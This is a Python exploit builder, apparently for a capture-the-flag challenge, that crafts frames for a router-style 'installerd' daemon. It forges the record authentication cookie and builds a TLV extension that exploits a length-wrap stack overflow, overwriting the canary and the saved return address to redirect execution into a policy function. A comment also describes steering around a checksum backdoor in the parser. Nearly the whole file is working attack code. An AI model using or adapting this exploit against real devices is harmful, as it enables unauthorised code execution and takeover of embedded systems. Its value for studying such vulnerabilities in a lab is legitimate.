#!/usr/bin/env python3
"""Build and inspect HomeHub installerd frames from the static wire format.

This is an offline reproducer.  It does not connect to the challenge service.
The HENV policy frame produced with opcode 1 is intentionally labelled as
rejected: installerd only dispatches type 0x100 through that opcode.  The same
record is useful when analysing the TLV-parser control-flow hijack because the
parser returns with x0 pointing at the copied global record.
"""

from __future__ import annotations

import argparse
import hashlib
import struct
from pathlib import Path


MASK64 = (1 << 64) - 1
MIX_C1 = 0x9E3779B185EBCA87
MIX_C2 = 0x319642B2D24D8EC3
MIX_C3 = 0x96DE1B173F119089
DOMAIN = 0x68486F6D65487562


def ror64(value: int, count: int) -> int:
    count &= 63
    return ((value >> count) | (value << (64 - count))) & MASK64


def installer_cookie(
    serial_u64: int,
    record_type: int,
    generation: int,
    size: int,
    digest: bytes,
) -> int:
    """Mirror routerd 0x8ea0..0x8f68 / installerd 0x8064..0x8144."""
    if len(digest) != 32:
        raise ValueError("digest must be exactly 32 bytes")
    q_hash_3 = int.from_bytes(digest[3:11], "little")
    q_hash_19 = int.from_bytes(digest[19:27], "little")
    value = ((generation & 0xFFFFFFFF) << 13) & MASK64
    value |= ((record_type & 0xFFFF) << 47) & MASK64
    value ^= serial_u64 & MASK64
    value ^= q_hash_3
    value ^= ((size & 0xFFFFFFFF) * MIX_C1) & MASK64
    value ^= ror64(q_hash_19, 57)
    value ^= DOMAIN
    value ^= value >> 29
    value = (value * MIX_C2) & MASK64
    value ^= value >> 32
    value = (value * MIX_C3) & MASK64
    value ^= value >> 28
    return value & MASK64


def make_record(
    *,
    serial_u64: int,
    record_type: int,
    generation: int,
    source: bytes,
    staged_path: str,
) -> bytes:
    path = staged_path.encode("ascii")
    if not staged_path.startswith("/tmp/restore/"):
        raise ValueError("policy requires the /tmp/restore/ prefix")
    suffix = staged_path[len("/tmp/restore/") :]
    if not suffix or "/" in suffix:
        raise ValueError("policy requires one non-empty basename after the prefix")
    if len(path) >= 72:
        raise ValueError("record path field is 72 bytes including its NUL")
    digest = hashlib.sha256(source).digest()
    cookie = installer_cookie(
        serial_u64, record_type, generation, len(source), digest
    )
    record = bytearray(128)
    record[0:4] = b"ITK6"
    struct.pack_into("<HHIIQ", record, 4, 4, record_type, generation, len(source), cookie)
    record[0x18:0x38] = digest
    record[0x38 : 0x38 + len(path)] = path
    return bytes(record)


def make_frame(record: bytes, extension: bytes = b"", opcode: int = 1) -> bytes:
    if len(record) != 128:
        raise ValueError("record must be 128 bytes")
    total = 0x90 + len(extension)
    if total > 0x600:
        raise ValueError("installerd recv buffer accepts at most 0x600 bytes")
    header = struct.pack(
        "<4sHHHHI", b"ISF6", 2, opcode, 0, len(extension), total
    )
    return header + record + extension


def parser_checksum(extension: bytes) -> int:
    """Checksum w5 computed by installerd 0x7aac..0x7ac4."""
    checksum = 0
    cursor = 0
    while cursor < len(extension):
        length = extension[cursor]
        cursor += 1
        if not length or cursor + length > len(extension):
            raise ValueError("malformed TLV extension")
        for byte in extension[cursor : cursor + length]:
            checksum = byte ^ (((checksum >> 27) | (checksum << 5)) & 0xFFFFFFFF)
        cursor += length
    return checksum


def overflow_extension(canary: int | None, return_address: int | None) -> bytes:
    """Trigger the low-byte cumulative-length wrap at installerd 0x7a64.

    TLV #1 copies one byte to local offset 0.  TLV #2 has length 255;
    (1 + 255) & 0xff == 0, so it passes the intended <= 0xc0 check and
    copies through local offset 255.  The canary is at local offset 192 and
    saved LR at offset 208.
    """
    second = bytearray(b"B" * 255)
    if canary is not None:
        second[191:199] = struct.pack("<Q", canary)
    if return_address is not None:
        second[199:207] = b"\x00" * 8  # saved x29
        second[207:215] = struct.pack("<Q", return_address)
    extension = b"\x01A\xff" + bytes(second)
    # The parser has an unrelated checksum backdoor that XORs the record's
    # generation when the checksum equals 0x6f6f626d. Avoid that one value so
    # the HENV generation checked by policy remains unchanged.
    if parser_checksum(extension) == 0x6F6F626D:
        second[0] ^= 1
        extension = b"\x01A\xff" + bytes(second)
    assert len(extension) == 0x102
    return extension


def parse_int(text: str) -> int:
    return int(text, 0)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("source", type=Path, help="0x4000-byte HENV bank image")
    ap.add_argument("--serial", required=True, help="device serial as 16 hex digits")
    ap.add_argument("--type", type=parse_int, default=0x211, choices=(0x211, 0x227))
    ap.add_argument("--generation", type=parse_int, help="default: little-endian word at HENV+8")
    ap.add_argument("--staged-path", default="/tmp/restore/bank.bin")
    ap.add_argument("--canary", type=parse_int, help="known installerd stack guard")
    ap.add_argument("--pie-base", type=parse_int, help="known installerd PIE base")
    ap.add_argument("--out-dir", type=Path, default=Path("."))
    args = ap.parse_args()

    source = args.source.read_bytes()
    if len(source) != 0x4000 or source[:4] != b"HENV":
        raise SystemExit("HENV policy requires a 0x4000-byte source beginning with HENV")
    generation = (
        args.generation
        if args.generation is not None
        else struct.unpack_from("<I", source, 8)[0]
    )
    serial_u64 = int(args.serial, 16)
    record = make_record(
        serial_u64=serial_u64,
        record_type=args.type,
        generation=generation,
        source=source,
        staged_path=args.staged_path,
    )
    extension = overflow_extension(
        args.canary,
        None if args.pie_base is None else args.pie_base + 0x7B48,
    )

    args.out_dir.mkdir(parents=True, exist_ok=True)
    (args.out_dir / "henv_record.bin").write_bytes(record)
    (args.out_dir / "henv_opcode1_rejected.bin").write_bytes(make_frame(record))
    (args.out_dir / "overflow_frame.bin").write_bytes(make_frame(record, extension))

    cookie = struct.unpack_from("<Q", record, 0x10)[0]
    print(f"serial key     = 0x{serial_u64:016x}")
    print(f"type/generation= 0x{args.type:03x} / {generation}")
    print(f"source sha256  = {hashlib.sha256(source).hexdigest()}")
    print(f"record cookie  = 0x{cookie:016x}")
    print(f"extension len  = 0x{len(extension):x}")
    print(f"frame len      = 0x{len(make_frame(record, extension)):x}")
    print(f"TLV checksum   = 0x{parser_checksum(extension):08x}")
    if args.canary is None or args.pie_base is None:
        print("overflow_frame.bin is a crash probe; control flow additionally needs canary and PIE base")
    else:
        print(f"saved LR       = 0x{args.pie_base + 0x7B48:016x} (policy function)")
        print("the policy write occurs before its eventual bad return/crash")


if __name__ == "__main__":
    main()
